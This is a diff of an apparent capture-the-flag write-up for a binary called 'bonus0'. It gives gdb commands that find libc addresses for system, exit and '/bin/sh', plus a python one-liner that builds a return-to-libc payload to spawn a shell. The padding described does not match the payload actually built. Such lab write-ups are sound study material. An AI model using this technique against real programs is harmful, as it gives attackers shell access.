@@ -26,22 +26,21 @@ int main()
     puts(&str);
 }
 
-# Dans gdb
+```
 p system
 p exit
 find &system, +99999999, "/bin/sh"
 ```
 
+```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) p exit
 $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 (gdb) find &system, +99999999, "/bin/sh"
 0xb7f8cc58
-
-
-## Structure du payload
 ```
+
 [42 bytes padding + 8 bytes saved ebp] + [addr system] + [addr exit] + [addr "/bin/sh"]
 
 python -c 'print "A"*20 + "\n" + "B"*8 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' | ./bonus0
